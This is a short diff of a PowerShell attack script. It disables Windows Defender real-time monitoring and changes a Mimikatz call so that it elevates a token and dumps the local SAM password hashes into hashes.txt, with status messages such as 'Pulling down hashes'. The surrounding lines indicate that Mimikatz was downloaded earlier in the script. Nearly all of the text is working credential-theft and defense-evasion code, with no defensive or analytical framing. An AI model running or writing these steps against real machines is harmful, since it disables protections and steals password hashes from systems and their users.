@@ -10,7 +10,8 @@ Write-Output "[+] Mimikatz downloaded and extracted"
 Set-MpPreference -DisableRealTimeMonitoring $true
 Write-Output "[+] Disabled Windows Defender"
 
-Write-Output "[-] Attempting to run Mimikatz"
+Write-Output "[+] Pulling down hashes"
 cd .\mimikatz\x64
-.\mimikatz.exe
+
+.\mimikatz.exe token::elevate lsadump::sam >> hashes.txt
 
